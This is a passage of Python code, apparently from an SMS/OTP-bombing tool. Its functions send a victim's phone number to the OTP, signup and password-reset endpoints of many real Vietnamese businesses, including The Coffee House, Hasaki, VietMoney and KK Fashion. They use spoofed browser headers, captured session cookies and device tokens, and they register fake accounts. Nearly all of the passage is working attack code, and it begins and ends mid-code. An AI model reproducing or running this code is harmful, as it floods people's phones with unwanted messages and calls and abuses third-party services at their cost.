        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': None,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSZLRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSZLRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonssms():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 1,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonssmsresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 1,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSSMSRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSSMSRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hoangphuc():
    cookies = {
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'form_key': 'JTtX1a62gBu8U3UN',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'PHPSESSID': 'd998f60e640fa72f86057c8958fb40ba',
        'mage-cache-sessid': 'true',
        'private_content_version': '0eab2366670393b2207e706a65ed9b4b',
        'section_data_ids': '{%22messages%22:null}',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; form_key=JTtX1a62gBu8U3UN; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=d998f60e640fa72f86057c8958fb40ba; mage-cache-sessid=true; private_content_version=0eab2366670393b2207e706a65ed9b4b; section_data_ids={%22messages%22:null}',
        'origin': 'https://hoangphuconline.vn',
        'priority': 'u=1, i',
        'referer': 'https://hoangphuconline.vn/customer/account/create/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': sdt,
        'form_key': 'JTtX1a62gBu8U3UN',
    }

    response = requests.post('https://hoangphuconline.vn/advancedlogin/otp/CheckValii/', cookies=cookies, headers=headers, data=data)
    print(response.text)


def trungsoncarezl():
    cookies = {
        'popNewLogin': '0',
        'sid_customer_s_558c5': '2c6597c4decf004b58a4b188d65efafd-1-C',
        'checkacc': '0',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'popNewLogin=0; sid_customer_s_558c5=2c6597c4decf004b58a4b188d65efafd-1-C; checkacc=0',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dorders.search',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'zalo',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': sdt,
        'security_hash': '2e95aca90d025bc949785961ba432043',
    }

    try:
        response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TRUNGSONCAREZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUNGSONCAREZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def trungsoncaresms():
    cookies = {
        'popNewLogin': '0',
        'sid_customer_s_558c5': '2c6597c4decf004b58a4b188d65efafd-1-C',
        'checkacc': '0',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'popNewLogin=0; sid_customer_s_558c5=2c6597c4decf004b58a4b188d65efafd-1-C; checkacc=0',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dprofiles.update',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'sms',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': sdt,
        'security_hash': '2e95aca90d025bc949785961ba432043',
    }

    try:
        response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TRUNGSONCARESMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUNGSONCARESMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def kkfashion():
    cookies = {
        'jpresta_cache_context': 'e67fa49f-162d-11ee-9cf4-0692000019e5',
        '_qg_fts': '1721578581',
        'QGUserId': '1896938940101377',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
        'PrestaShop-7cbf831598fa6791cd6d07d5b5873d26': 'def502007b8c8eb61736105deec2c85b445e6b2b827b1c9881ead4a1ec5871091282a04d8ff5014f99895733add04bfa3275048c602279d788847264d33d990cebe62d9a15000217ffdd531574e2cdc2848c276e0739404447439d8ce193208fe23a7ec6d710571ea52c1105a2d4d7ee79614b41e1b48de782c3410d1f20ac399f7a0922ff7e5643597bb8cde4bee8dc764d41bec75afe39a9c71c942627ed995e9f5bddc231678f21cf69365f0cf548bc67a888ef420102a0b233c45ed78b2d262d36518dc78b61f6eff594c9e2af4b11e3f25edd',
        'PHPSESSID': 'd6e6f38ea2j2tf3m264h26599v',
        'PrestaShop-03bfe1c20f5691800e1f882876466fe7': 'def50200a1276f3d7b88be6bf9b7363cc6a59f6ba6b1453cb3b46c0633940c04a97756272df36d87542e8a27e57038d4b7936ffed9c1e753d9ee9a30effd837ab2846cf4d3a67fd12c07b04e5aa5c8aaf0be9f8aeecf4c685c42eb85987277010284ddcad86163c8ee6cb7ff98c89909d3de555a7f7fdc5bdbdd9c31bd8882e2dcb962799979fdab88a49b719d3cdaef4617f0c7c735099ae76dd72c8afaa66ce54698d12810f5d9cae8add5a54fc79cab7aaa016f23fb78ac404c03a9ce81a78abaa2cf793ff38929e312c6182028b27dc77105c3c0d5022c5ba4674d25b3a11982034a8080d39601ad371dd8ec95fab4e776f1688c25428aee70f107ce7693a30156b6993e7a777e528a68c86c822cc375ccfa629cf58990ed',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'jpresta_cache_context=e67fa49f-162d-11ee-9cf4-0692000019e5; _qg_fts=1721578581; QGUserId=1896938940101377; _qg_pushrequest=true; _qg_cm=1; PrestaShop-7cbf831598fa6791cd6d07d5b5873d26=def502007b8c8eb61736105deec2c85b445e6b2b827b1c9881ead4a1ec5871091282a04d8ff5014f99895733add04bfa3275048c602279d788847264d33d990cebe62d9a15000217ffdd531574e2cdc2848c276e0739404447439d8ce193208fe23a7ec6d710571ea52c1105a2d4d7ee79614b41e1b48de782c3410d1f20ac399f7a0922ff7e5643597bb8cde4bee8dc764d41bec75afe39a9c71c942627ed995e9f5bddc231678f21cf69365f0cf548bc67a888ef420102a0b233c45ed78b2d262d36518dc78b61f6eff594c9e2af4b11e3f25edd; PHPSESSID=d6e6f38ea2j2tf3m264h26599v; PrestaShop-03bfe1c20f5691800e1f882876466fe7=def50200a1276f3d7b88be6bf9b7363cc6a59f6ba6b1453cb3b46c0633940c04a97756272df36d87542e8a27e57038d4b7936ffed9c1e753d9ee9a30effd837ab2846cf4d3a67fd12c07b04e5aa5c8aaf0be9f8aeecf4c685c42eb85987277010284ddcad86163c8ee6cb7ff98c89909d3de555a7f7fdc5bdbdd9c31bd8882e2dcb962799979fdab88a49b719d3cdaef4617f0c7c735099ae76dd72c8afaa66ce54698d12810f5d9cae8add5a54fc79cab7aaa016f23fb78ac404c03a9ce81a78abaa2cf793ff38929e312c6182028b27dc77105c3c0d5022c5ba4674d25b3a11982034a8080d39601ad371dd8ec95fab4e776f1688c25428aee70f107ce7693a30156b6993e7a777e528a68c86c822cc375ccfa629cf58990ed',
        'origin': 'https://www.kkfashion.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.kkfashion.vn/dang-nhap?create_account=1',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    params = {
        'create_account': '1',
    }
    random_email = generate_random_email()
    data = {
        'username': 'tran dat',
        'phone': sdt,
        'email': random_email,
        'password': '123123aA@',
        'city': 'Thành phố Cần Thơ',
        'district': 'Huyện Cờ Đỏ',
        'ward': 'Thới Xuân',
        'address2': 'Thới Xuân - Huyện Cờ Đỏ',
        'address1': '22 tan te3 ',
        'submitCreate': '1',
    }

    response = requests.post('https://www.kkfashion.vn/dang-nhap', params=params, cookies=cookies, headers=headers, data=data)

    cookies = {
        '_qg_fts': '1721578581',
        'QGUserId': '1896938940101377',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
        'PHPSESSID': 'd6e6f38ea2j2tf3m264h26599v',
        'jpresta_cache_source_6666cd76f96956469e7be39d750cc7d9': '2',
        'PrestaShop-7cbf831598fa6791cd6d07d5b5873d26': 'def5020068bc9968a1f8eaaf0c1d13a95cc8f785bc1e80ef97d2381149d44416b718ea0e1ec703548d1e2c36c17c2fc7bb621176cc5144ba9afbd8e52ab34e62676287139a492a5fb1df85974c1d817955c9dbd66fb0048b6d55396eb82141cd0082257db6f741e461e897ac3bab90f3da71886e4b0a4c48699290185853153f52531995e21cea01e5f336ee0b4f2be6b6eb24eab82935a13898ef71d00e23f59018d4a57353e0ed77c1d620ca46aa302c8dee2b3b4befd342b1db81d32f88c89cc27c55af97e559e6c67e0fc37871bb29cdedb3f218d114857262c878fb3cc1d18c81bb76981cbbc5b2c4f9598485b794288ecc2a4c5f7ad27f78838b5b898f137721fef9c7625ee410bd91cbe2ae87d3a0e2700c5bff120321beec50628206',
        'jpresta_cache_context': 'e67fa49f-162d-11ee-9cf4-0692000019e5',
        'PrestaShop-03bfe1c20f5691800e1f882876466fe7': 'def502004244d73ba44dfc4e9f94dfa641d33aa71985561b821acd2d8a87e724e19921f344cb9602cba1c49d99a5e60c05d71d9022fe3ecb2c8832b6bf3deb69101ae3e8872ff32d28a90f0687bd88bd84ca74216d1e312c2a43f84130230fff88fcc2289870ac6445e93d49ce1bb2bc14b780a65adfea4923c5e9e5a8eb4fde527ca1692bb6e01c850b86614cddd69e138438283f8230e315366ede432762e712bf75a18fd0c078028c11dbeeb8e0813a23608919ec47e413cdc60d0da1cea2cd3f327402ce72e7db4fb60d77d2f7096b6fb0b4bdfc015e4d374f3b143d11c5c5d15b17093c695393ccf24bc6122ec7e960e25b94187f73735c06eb0b71e16d333dd26ea6f24904b4a46e4558359cd94743',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_qg_fts=1721578581; QGUserId=1896938940101377; _qg_pushrequest=true; _qg_cm=1; PHPSESSID=d6e6f38ea2j2tf3m264h26599v; jpresta_cache_source_6666cd76f96956469e7be39d750cc7d9=2; PrestaShop-7cbf831598fa6791cd6d07d5b5873d26=def5020068bc9968a1f8eaaf0c1d13a95cc8f785bc1e80ef97d2381149d44416b718ea0e1ec703548d1e2c36c17c2fc7bb621176cc5144ba9afbd8e52ab34e62676287139a492a5fb1df85974c1d817955c9dbd66fb0048b6d55396eb82141cd0082257db6f741e461e897ac3bab90f3da71886e4b0a4c48699290185853153f52531995e21cea01e5f336ee0b4f2be6b6eb24eab82935a13898ef71d00e23f59018d4a57353e0ed77c1d620ca46aa302c8dee2b3b4befd342b1db81d32f88c89cc27c55af97e559e6c67e0fc37871bb29cdedb3f218d114857262c878fb3cc1d18c81bb76981cbbc5b2c4f9598485b794288ecc2a4c5f7ad27f78838b5b898f137721fef9c7625ee410bd91cbe2ae87d3a0e2700c5bff120321beec50628206; jpresta_cache_context=e67fa49f-162d-11ee-9cf4-0692000019e5; PrestaShop-03bfe1c20f5691800e1f882876466fe7=def502004244d73ba44dfc4e9f94dfa641d33aa71985561b821acd2d8a87e724e19921f344cb9602cba1c49d99a5e60c05d71d9022fe3ecb2c8832b6bf3deb69101ae3e8872ff32d28a90f0687bd88bd84ca74216d1e312c2a43f84130230fff88fcc2289870ac6445e93d49ce1bb2bc14b780a65adfea4923c5e9e5a8eb4fde527ca1692bb6e01c850b86614cddd69e138438283f8230e315366ede432762e712bf75a18fd0c078028c11dbeeb8e0813a23608919ec47e413cdc60d0da1cea2cd3f327402ce72e7db4fb60d77d2f7096b6fb0b4bdfc015e4d374f3b143d11c5c5d15b17093c695393ccf24bc6122ec7e960e25b94187f73735c06eb0b71e16d333dd26ea6f24904b4a46e4558359cd94743',
        'origin': 'https://www.kkfashion.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.kkfashion.vn/khoi-phuc-mat-khau',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'otpcode': '',
    }

    try:
        response = requests.post('https://www.kkfashion.vn/module/nj_sms/forgotPassword', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KKFASHION | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KKFASHION | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thecoffeehouse():# check
    cookies = {
        '_fbp': 'fb.1.1735445416958.421812788735503682',
        '_ga': 'GA1.1.1468517502.1735445416',
        '_ga_8WYX50CXX1': 'GS1.1.1735445416.1.0.1735445416.60.0.0',
        '_gat': '1',
        '_gat_gtag_UA_74991073_10': '1',
        '_gid': 'GA1.2.422886087.1735445416',
    }

    headers = {
        'Host': 'api.thecoffeehouse.com',
        'Accept': 'application/json',
        'TCH-DEVICE-ID': '07656846-4793-4232-8209-B756630A7277',
        'Accept-Language': 'vi',
        'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': '(iPhone7; iOS 15.8.2)',
        'TCH-APP-VERSION': '5.9.31',
        # 'Cookie': '_fbp=fb.1.1735445416958.421812788735503682; _ga=GA1.1.1468517502.1735445416; _ga_8WYX50CXX1=GS1.1.1735445416.1.0.1735445416.60.0.0; _gat=1; _gat_gtag_UA_74991073_10=1; _gid=GA1.2.422886087.1735445416',
        'TCH-APP-DEVICE-CHECK': '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',
    }

    json_data = {
        'phone': {
            'phone_number': sdt,
            'region_code': '+84',
        },
    }
    
    try:
        response = requests.post('https://api.thecoffeehouse.com/api/v5/auth/request-otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THECOFFEEHOUSE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THECOFFEEHOUSE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hasaki():
    cookies = {
        'HASAKI_SESSID': '900e892e3fe58b9cb88bfe7fe64966b5',
        'form_key': '900e892e3fe58b9cb88bfe7fe64966b5',
        'sessionChecked': '1733543841',
    }

    headers = {
        'Host': 'api.hasaki.vn',
        # 'Cookie': 'HASAKI_SESSID=900e892e3fe58b9cb88bfe7fe64966b5; form_key=900e892e3fe58b9cb88bfe7fe64966b5; sessionChecked=1733543841',
        'content-type': 'application/json; charset=utf-8',
        'mobileappversion': '2.3.87',
        'mobileregion': 'VN',
        'accept': 'application/json',
        'mobileosversion': '15.8.2',
        'accept-language': 'vi-VN,vi;q=0.9',
        'mobilecartid': '0',
        'mobiledeviceid': '597F2031-B49F-4701-8A48-A94D58BA5DDB',
        'user-agent': 'Hasaki.vn/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'mobileplatform': 'ios',
    }

    params = {
        'username': sdt,
    }

    try:
        response = requests.get('https://api.hasaki.vn/mobile/v3/user/get-code-verify', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HASAKI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietmoney():
    headers = {
        'Host': 'gateway.vietmoney.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'VietMoney/166 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
        'otpMethod': 'sms',
    }

    try:
        response = requests.post('https://gateway.vietmoney.vn/digital-svc/v1/auth/signup', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETMONEY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETMONEY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietmoneycall(): # 429
    headers = {
        'Host': 'gateway.vietmoney.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'VietMoney/166 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt,
        'otpMethod': 'call',
    }


    try:
        response = requests.post('https://gateway.vietmoney.vn/digital-svc/v1/auth/signup', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETMONEYCALL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETMONEYCALL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def aeonmall(): #ap, 403 check
    headers = {
        'Host': 'api.aeonmall-vietnam.com',
        'accept': '*/*',
